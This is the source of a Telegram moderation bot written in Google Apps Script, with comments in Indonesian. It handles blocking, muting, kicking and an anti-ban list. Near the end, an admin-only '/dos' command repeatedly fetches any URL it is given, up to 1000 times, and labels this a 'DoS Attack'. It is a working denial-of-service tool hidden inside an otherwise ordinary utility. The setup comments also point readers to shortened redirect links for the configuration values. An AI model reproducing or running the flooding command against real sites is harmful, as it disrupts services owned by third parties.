// Pastikan Anda telah menambahkan library Lumpia ke proyek Google Apps Script Anda.
// ID library Lumpia: 1Yo6vQRwjG5Gl9jeEF0g2tBTUa0XN5MyT4G_HeDpRr9DvabxhRcSdhPNj
// copy url ini https://sfl.gl/wOJmku
const BOT_TOKEN = 'BOT_TOKEN_KAMU'; // Ganti dengan token bot Anda
// copy url ini https://sfl.gl/iJ6BU
const WEBHOOK_URL = 'URL_WEBHOOK_KAMU'; // Ganti dengan URL aplikasi web Anda
// copy url ini https://sfl.gl/MHCHMRTr
const ADMIN_CHAT_IDS = [ADMIN_ID_KAMU, ADMIN_ID_LAIN, ADMIN_ID_TEMEN_KAMU]; // Ganti dengan ID chat admin (bisa lebih dari satu)
const BOT_USERNAME = '@USERNAME_BOT_KAMU'; // Ganti dengan username bot Anda (misalnya, 'nama_bot')
const SPAM_BOT_USERNAME = '@SpamBot'; // Username bot Telegram untuk memblokir pengguna
const MISS_ROSE_USERNAME = '@MissRose_bot'; // Username bot Telegram Miss Rose

const blockedUsers = PropertiesService.getUserProperties(); // Properti untuk menyimpan daftar pengguna yang diblokir
const userCommandAttempts = PropertiesService.getUserProperties(); // Properti untuk melacak percobaan perintah pengguna
const antiBanUsers = PropertiesService.getUserProperties(); // Properti untuk menyimpan daftar pengguna yang dilindungi dari ban

const MAX_ID_COMMAND_ATTEMPTS = 1; // Batas percobaan perintah /id sebelum diblokir

// Konfigurasi Admin dan Pemilik (Gunakan PropertiesService untuk penyimpanan yang lebih baik)
const adminConfig = PropertiesService.getScriptProperties();
const OWNER_ID_KEY = 'ownerId';
const ADMINS_KEY = 'admins';

function setOwnerId(ownerId, requesterId) {
  if (!isAdmin(requesterId)) {
    return 'Anda bukan admin untuk mengatur pemilik.';
  }
  adminConfig.setProperty(OWNER_ID_KEY, ownerId.toString());
  return `Pemilik bot telah diatur ke ID: <code>${ownerId}</code>`;
}

function getOwnerId() {
  return adminConfig.getProperty(OWNER_ID_KEY);
}

function getAdmins() {
  const admins = adminConfig.getProperty(ADMINS_KEY);
  return admins ? JSON.parse(admins) : ADMIN_CHAT_IDS.map(id => id.toString()); // Sertakan admin awal
}

function isAdmin(chatId) {
  return getAdmins().includes(chatId.toString());
}

function isOwner(chatId) {
  return chatId.toString() === getOwnerId();
}

function isProtected(userId) {
  const protectedList = antiBanUsers.getProperty('protected_list');
  return protectedList ? JSON.parse(protectedList).includes(userId.toString()) : false;
}

function protectUser(userId) {
  let protectedList = antiBanUsers.getProperty('protected_list');
  protectedList = protectedList ? JSON.parse(protectedList) : [];
  if (!protectedList.includes(userId.toString())) {
    protectedList.push(userId.toString());
    antiBanUsers.setProperty('protected_list', JSON.stringify(protectedList));
    return true;
  }
  return false;
}

function unprotectUser(userId) {
  let protectedList = antiBanUsers.getProperty('protected_list');
  if (protectedList) {
    protectedList = JSON.parse(protectedList);
    const index = protectedList.indexOf(userId.toString());
    if (index > -1) {
      protectedList.splice(index, 1);
      antiBanUsers.setProperty('protected_list', JSON.stringify(protectedList));
      return true;
    }
  }
  return false;
}

function getProtectedList(requesterId) {
  if (!isAdmin(requesterId)) {
    return 'Anda bukan admin untuk melihat daftar pengguna yang dilindungi.';
  }
  const protectedList = antiBanUsers.getProperty('protected_list');
  if (protectedList) {
    const parsedList = JSON.parse(protectedList);
    if (parsedList.length > 0) {
      return `<b>Daftar Pengguna yang Dilindungi:</b>\n<code>${parsedList.join(', ')}</code>`;
    } else {
      return 'Tidak ada pengguna yang saat ini dilindungi.';
    }
  } else {
    return 'Tidak ada pengguna yang saat ini dilindungi.';
  }
}

function isBlocked(userId) {
  const blockedList = blockedUsers.getProperty('blocked_list');
  return blockedList ? JSON.parse(blockedList).includes(userId.toString()) : false;
}

function blockUser(userId) {
  let blockedList = blockedUsers.getProperty('blocked_list');
  blockedList = blockedList ? JSON.parse(blockedList) : [];
  if (!blockedList.includes(userId.toString())) {
    blockedList.push(userId.toString());
    blockedUsers.setProperty('blocked_list', JSON.stringify(blockedList));
    return true;
  }
  return false;
}

function unblockUser(userId) {
  let blockedList = blockedUsers.getProperty('blocked_list');
  if (blockedList) {
    blockedList = JSON.parse(blockedList);
    const index = blockedList.indexOf(userId.toString());
    if (index > -1) {
      blockedList.splice(index, 1);
      blockedUsers.setProperty('blocked_list', JSON.stringify(blockedList));
      return true;
    }
  }
  return false;
}

function getBlockedList(requesterId) {
  if (!isAdmin(requesterId)) {
    return 'Anda bukan admin untuk melihat daftar blokir.';
  }
  const blockedList = blockedUsers.getProperty('blocked_list');
  if (blockedList) {
    const parsedList = JSON.parse(blockedList);
    if (parsedList.length > 0) {
      return `<b>Daftar Pengguna yang Diblokir:</b>\n<code>${parsedList.join(', ')}</code>`;
    } else {
      return 'Tidak ada pengguna yang saat ini diblokir.';
    }
  } else {
    return 'Tidak ada pengguna yang saat ini diblokir.';
  }
}
function muteUser(chatId, userId, durationInSeconds) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/restrictChatMember`;
  const unixTimestamp = Math.floor(Date.now() / 1000) + durationInSeconds;
  const data = {
    chat_id: chatId,
    user_id: userId,
    permissions: { can_send_messages: false },
    until_date: durationInSeconds ? unixTimestamp : undefined // Optional duration
  };
  const options = {
    method: 'post',
    contentType: 'application/json',
    payload: JSON.stringify(data)
  };
  try {
    const response = UrlFetchApp.fetch(url, options);
    const jsonResponse = JSON.parse(response.getContentText());
    if (jsonResponse.ok) {
      Logger.log(`User ${userId} muted in ${chatId}`);
      return true;
    } else {
      Logger.error(`Failed to mute user ${userId} in ${chatId}: ${JSON.stringify(jsonResponse)}`);
      return false;
    }
  } catch (error) {
    Logger.error(`Error muting user ${userId} in ${chatId}: ${error}`);
    return false;
  }
}

function setWebhook() {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${WEBHOOK_URL}`;
  const response = UrlFetchApp.fetch(url);
  Logger.log('Set Webhook Response:', response.getContentText());
}

function deleteWebhook() {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`;
  const response = UrlFetchApp.fetch(url);
  Logger.log('Delete Webhook Response:', response.getContentText());
}

function sendTelegramAdminMessage(message) {
  ADMIN_CHAT_IDS.forEach(adminId => {
    sendMessage(adminId, message, 'HTML');
  });
}

function kickChatMember(chatId, userId) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/kickChatMember`;
  const data = {
    chat_id: chatId,
    user_id: userId,
    until_date: 0 // 0 berarti kick permanen
  };
  const options = {
    method: 'post',
    contentType: 'application/json',
    payload: JSON.stringify(data)
  };
  try {
    const response = UrlFetchApp.fetch(url, options);
    const jsonResponse = JSON.parse(response.getContentText());
    if (jsonResponse.ok) {
      Logger.log(`Berhasil mengeluarkan pengguna ${userId} dari chat ${chatId}`);
      return true;
    } else {
      Logger.error(`Gagal mengeluarkan pengguna ${userId} dari chat ${chatId}: ${JSON.stringify(jsonResponse)}`);
      return false;
    }
  } catch (error) {
    Logger.error(`Error saat mencoba mengeluarkan pengguna ${userId} dari chat ${chatId}: ${error}`);
    return false;
  }
}

function doPost(e) {
  try {
    const contents = JSON.parse(e.postData.contents);
    Logger.log('Webhook Received:', contents);

    if (contents.message) {
      const chatId = contents.message.chat.id;
      const userId = contents.message.from.id;
      const firstName = contents.message.from.first_name || '';
      const text = contents.message.text;
      const replyToMessage = contents.message.reply_to_message;
      const chatType = contents.message.chat.type;
      const chatUsername = contents.message.chat.username ? `@${contents.message.chat.username}` : 'Tidak ada';
      const messageId = contents.message.message_id;

      // Periksa apakah pengguna diblokir
      if (isBlocked(userId) && !isAdmin(chatId)) {
        Logger.log(`Pengguna ${userId} diblokir, pesan tidak diproses.`);
        return ContentService.createTextOutput(JSON.stringify({ "method": "post" })).setMimeType(ContentService.MimeType.JSON);
      }

      // Fitur Anti Ban Permanen (Hanya Logika di Bot Sendiri)
      if (isProtected(userId)) {
        Logger.log(`Pengguna ${userId} dilindungi dari ban.`);
        // Di sini Anda bisa menambahkan logika tambahan jika diperlukan,
        // misalnya mengirim notifikasi ke admin jika pengguna yang dilindungi mencoba perintah terlarang.
      }

      if (text === '/start') {
        if (isAdmin(chatId)) {
          const reply = `<b>Informasi Bot</b>\n` +
                        `<b>Admin ID:</b> <code>${chatId}</code>\n` +
                        `<b>Info Chat:</b>\n` +
                        `  <b>ID:</b> <code>${chatId}</code>\n` +
                        `  <b>Jenis:</b> <code>${chatType}</code>\n` +
                        `  <b>Username:</b> <code>${chatUsername}</code>\n` +
                        `<b>Username Bot:</b> <code>${BOT_USERNAME}</code>\n` +
                        `<b>Jenis Bot:</b> Bot Biasa`;
          sendMessage(chatId, reply, 'HTML');
        } else {
          // Catat percobaan perintah /start oleh pengguna non-admin
          const attemptsKey = `user_${userId}_start_attempts`; // Key yang berbeda untuk /start
          let attempts = parseInt(userCommandAttempts.getProperty(attemptsKey) || '0') + 1;
          userCommandAttempts.setProperty(attemptsKey, attempts.toString());

          if (attempts >= MAX_ID_COMMAND_ATTEMPTS) { // Menggunakan batas yang sama dengan /id
            Logger.log(`Pengguna ${userId} (${chatId}) mencoba perintah /start ${attempts} kali. Memblokir dan melaporkan ke ${SPAM_BOT_USERNAME} & ${MISS_ROSE_USERNAME}.`);
            blockUser(userId);
            const reportMessage = `🚨 Penyalahgunaan Perintah /start 🚨\nPengguna ID: <code>${userId}</code>\nNama: ${firstName}\nUsername: ${chatUsername}\nChat ID: <code>${chatId}</code>\nTelah mencoba perintah <code>/start</code> sebanyak ${attempts} kali.\nTindakan: Diblokir oleh bot. Disarankan untuk dilaporkan ke ${SPAM_BOT_USERNAME} dan ${MISS_ROSE_USERNAME}.`;
            sendTelegramAdminMessage(reportMessage);
            sendMessage(chatId, `Anda telah mencoba perintah yang tidak diizinkan terlalu banyak kali. Anda telah diblokir oleh bot.`);
            // Opsi untuk mencoba kick pengguna dari grup (jika dalam grup)
            if (chatType === 'group' || chatType === 'supergroup') {
              kickChatMember(chatId, userId);
            }
            // Tidak ada interaksi otomatis dengan @SpamBot atau @MissRose_bot.
          } else {
            const reply = `<b>Informasi Bot</b>\n` +
                          `<b>Admin ID:</b> <code>${chatId}</code>\n` +
                          `<b>Info Chat:</b>\n` +
                          `  <b>ID:</b> <code>${chatId}</code>\n` +
                          `  <b>Jenis:</b> <code>${chatType}</code>\n` +
                          `  <b>Username:</b> <code>${chatUsername}</code>\n` +
                          `<b>Username Bot:</b> <code>${BOT_USERNAME}</code>\n` +
                          `<b>Jenis Bot:</b> Bot Biasa`;
            sendMessage(chatId, reply, 'HTML');
            const warningMessage = `⚠️ Percobaan Perintah /start ⚠️\nPengguna ID: <code>${userId}</code>\nNama: ${firstName}\nUsername: ${chatUsername}\nChat ID: <code>${chatId}</code>\nTelah mencoba perintah <code>/start</code> (percobaan ke-${attempts}).`;
            Logger.log(warningMessage);
          }
        }
      } else if (text.startsWith('/setowner ') && isAdmin(chatId)) {
        const ownerIdToSet = text.substring('/setowner '.length).trim();
        const result = setOwnerId(ownerIdToSet, chatId);
        sendMessage(chatId, result, 'HTML');
      } else if (text === '/listadmin' && isAdmin(chatId)) {
        const admins = getAdmins();
        sendMessage(chatId, `<b>Daftar Admin:</b>\n<code>${admins.join(', ')}</code>`, 'HTML');
      } else if (text.startsWith('/protect ') && isAdmin(chatId)) {
        const parts = text.split(' ');
        if (parts.length === 2) {
          const target = parts[1].trim();
          let targetUserId = null;
          if (target.startsWith('@')) {
            sendMessage(chatId, `Maaf, perlindungan menggunakan username (<code>${target}</code>) tidak didukung secara langsung. Silakan gunakan ID pengguna atau balas pesan pengguna.`, 'HTML');
          } else if (!isNaN(parseInt(target))) {
            targetUserId = parseInt(target);
            if (protectUser(targetUserId)) {
              sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> telah ditambahkan ke daftar perlindungan anti-ban.`, 'HTML');
            } else {
              sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> sudah ada dalam daftar perlindungan anti-ban.`, 'HTML');
            }
          } else {
            sendMessage(chatId, 'Penggunaan perintah <code>/protect</code> yang benar adalah dengan membalas pesan pengguna atau menggunakan <code>/protect [ID Pengguna]</code>.', 'HTML');
          }
        } else if (replyToMessage) {
          const targetUserId = replyToMessage.from.id;
          if (protectUser(targetUserId)) {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> (mereply pesan ini) telah ditambahkan ke daftar perlindungan anti-ban.`, 'HTML');
          } else {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> (mereply pesan ini) sudah ada dalam daftar perlindungan anti-ban.`, 'HTML');
          }
        } else {
          sendMessage(chatId, 'Penggunaan perintah <code>/protect</code> yang benar adalah dengan membalas pesan pengguna atau menggunakan <code>/protect [ID Pengguna]</code>.', 'HTML');
        }
      } else if (text === '/unprotect' && isAdmin(chatId)) {
        if (replyToMessage) {
          const targetUserId = replyToMessage.from.id;
          if (unprotectUser(targetUserId)) {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> (mereply pesan ini) telah dihapus dari daftar perlindungan anti-ban.`, 'HTML');
          } else {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> (mereply pesan ini) tidak ditemukan dalam daftar perlindungan anti-ban.`, 'HTML');
          }
        } else if (text.startsWith('/unprotect ')) {
          const target = text.substring('/unprotect '.length).trim();
          if (!isNaN(parseInt(target))) {
            const targetUserId = parseInt(target);
            if (unprotectUser(targetUserId)) {
              sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> telah dihapus dari daftar perlindungan anti-ban.`, 'HTML');
            } else {
              sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> tidak ditemukan dalam daftar perlindungan anti-ban.`, 'HTML');
            }
          } else {
            sendMessage(chatId, 'Penggunaan perintah <code>/unprotect</code> yang benar adalah dengan membalas pesan pengguna atau menggunakan <code>/unprotect [ID Pengguna]</code>.', 'HTML');
          }
        } else {
          sendMessage(chatId, 'Balas pesan pengguna yang ingin Anda hapus dari perlindungan atau gunakan format <code>/unprotect [ID Pengguna]</code>.', 'HTML');
        }
      } else if (text === '/listprotect' && isAdmin(chatId)) {
        const protectedListMessage = getProtectedList(chatId);
        sendMessage(chatId, protectedListMessage, 'HTML');
      } else if (text === '/id') {
        if (isAdmin(chatId)) {
          if (replyToMessage) {
            const repliedUserId = replyToMessage.from.id;
            blockUser(repliedUserId);
            sendMessage(chatId, `Pengguna dengan ID <code>${repliedUserId}</code> (mereply pesan ini) telah diblokir.`, 'HTML');
          } else {
            sendMessage(chatId, 'Balas pesan pengguna yang ingin Anda blokir dengan perintah <code>/id</code>.');
          }
        } else {
          // Catat percobaan perintah /id oleh pengguna non-admin
          const attemptsKey = `user_${userId}_id_attempts`;
          let attempts = parseInt(userCommandAttempts.getProperty(attemptsKey) || '0') + 1;
          userCommandAttempts.setProperty(attemptsKey, attempts.toString());

          if (attempts >= MAX_ID_COMMAND_ATTEMPTS) {
            Logger.log(`Pengguna ${userId} (${chatId}) mencoba perintah /id ${attempts} kali. Memblokir dan melaporkan ke ${SPAM_BOT_USERNAME} & ${MISS_ROSE_USERNAME}.`);
            blockUser(userId);
            const reportMessage = `🚨 Potensi Penyalahgunaan Perintah 🚨\nPengguna ID: <code>${userId}</code>\nNama: ${firstName}\nUsername: ${chatUsername}\nChat ID: <code>${chatId}</code>\nTelah mencoba perintah <code>/id</code> sebanyak ${attempts} kali.\nTindakan: Diblokir oleh bot. Disarankan untuk dilaporkan ke ${SPAM_BOT_USERNAME} dan ${MISS_ROSE_USERNAME}.`;
            sendTelegramAdminMessage(reportMessage);
            sendMessage(chatId, `Anda telah mencoba perintah yang tidak diizinkan terlalu banyak kali. Anda telah diblokir oleh bot.`);
            // Opsi untuk mencoba kick pengguna dari grup (jika dalam grup)
            if (chatType === 'group' || chatType === 'supergroup') {
              kickChatMember(chatId, userId);
            }
            // Tidak ada interaksi otomatis dengan @SpamBot atau @MissRose_bot.
          } else {
            sendMessage(chatId, `Anda tidak memiliki izin untuk menggunakan perintah ini.`);
            const warningMessage = `⚠️ Percobaan Perintah Ilegal ⚠️\nPengguna ID: <code>${userId}</code>\nNama: ${firstName}\nUsername: ${chatUsername}\nChat ID: <code>${chatId}</code>\nTelah mencoba perintah <code>/id</code> (percobaan ke-${attempts}).`;
            Logger.log(warningMessage);
          }
        }
      } else if (/^-638\d+$/.test(text)) {
        sendMessage(chatId, `<code>${text}</code>`, 'HTML');
      } else if (text.startsWith('/unblock ') && isAdmin(chatId)) {
        const target = text.substring('/unblock '.length).trim();
        if (!isNaN(parseInt(target))) {
          const targetUserId = parseInt(target);
          if (unblockUser(targetUserId)) {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> telah dibebaskan.`, 'HTML');
          } else {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> tidak ditemukan dalam daftar blokir.`, 'HTML');
          }
        } else if (replyToMessage) {
          const targetUserId = replyToMessage.from.id;
          if (unblockUser(targetUserId)) {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> (mereply pesan ini) telah dibebaskan.`, 'HTML');
          } else {
            sendMessage(chatId, `Pengguna dengan ID <code>${targetUserId}</code> (mereply pesan ini) tidak ditemukan dalam daftar blokir.`, 'HTML');
          }
        } else {
          sendMessage(chatId, 'Penggunaan perintah <code>/unblock</code> yang benar adalah dengan membalas pesan pengguna atau menggunakan <code>/unblock [ID Pengguna]</code>.', 'HTML');
        }
      } else if (text === '/listblock') {
        const blockedListMessage = getBlockedList(chatId);
        sendMessage(chatId, blockedListMessage, 'HTML');
      } else if (text.startsWith('/dos ') && isAdmin(chatId)) {
        const args = text.split(' ');
        if (args.length >= 2) {
          const urlTarget = args[1].trim();
          const jumlahRequest = args.length >= 3 ? parseInt(args[2]) : 5; // Default 5 kalau tidak disebutkan
          const isValidUrl = /^https?:\/\/[^\s]+$/.test(urlTarget);
          const maxRequest = 1000;

          if (!isValidUrl) {
            sendMessage(chatId, 'URL tidak valid. Gunakan format: <code>/dos https://target.com [jumlah]</code>', 'HTML');
          } else if (isNaN(jumlahRequest) || jumlahRequest <= 0 || jumlahRequest > maxRequest) {
            sendMessage(chatId, `Jumlah request tidak valid. Gunakan angka antara 1 hingga ${maxRequest}.`, 'HTML');
          } else {
            sendMessage(chatId, `🚀 <b>DoS Attack Dimulai</b>\nTarget: <code>${urlTarget}</code>\nJumlah Request: <code>${jumlahRequest}x</code>\nStatus: <i>Berjalan...</i>`, 'HTML');

            for (let i = 1; i <= jumlahRequest; i++) {
              try {
                const res = UrlFetchApp.fetch(urlTarget, { muteHttpExceptions: false, followRedirects: true });
                Logger.log(`Request ke-${i}: ${res.getResponseCode()}`);
              } catch (err) {
                Logger.log(`Request ke-${i} gagal: ${err}`);
              }
              if (i % 10 === 0) Utilities.sleep(500); // Delay setiap 10 request untuk aman
            }

            sendMessage(chatId, `✅ <b>DoS Attack Selesai</b>\nTarget: <code>${urlTarget}</code>\nTotal Request: <code>${jumlahRequest}x</code>`, 'HTML');
          }
        } else {
          sendMessage(chatId, 'Format salah. Gunakan: <code>/dos https://target.com [jumlah]</code>', 'HTML');
        }
      } else {
        // Tambahkan logika untuk perintah lain di sini jika diperlukan
        Logger.log(`Pesan dari ${chatId}: ${text}`);
      }
    }
  } catch (error) {
    Logger.error('Error processing webhook:', error);
  }
}

function sendMessage(chatId, text, parseMode) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const data = {
    chat_id: chatId,
    text: text,
    parse_mode: parseMode // Tambahkan parameter parse_mode
  };
  const options = {
    method: 'post',
    contentType: 'application/json',
    payload: JSON.stringify(data)
  };
  UrlFetchApp.fetch(url, options);
}
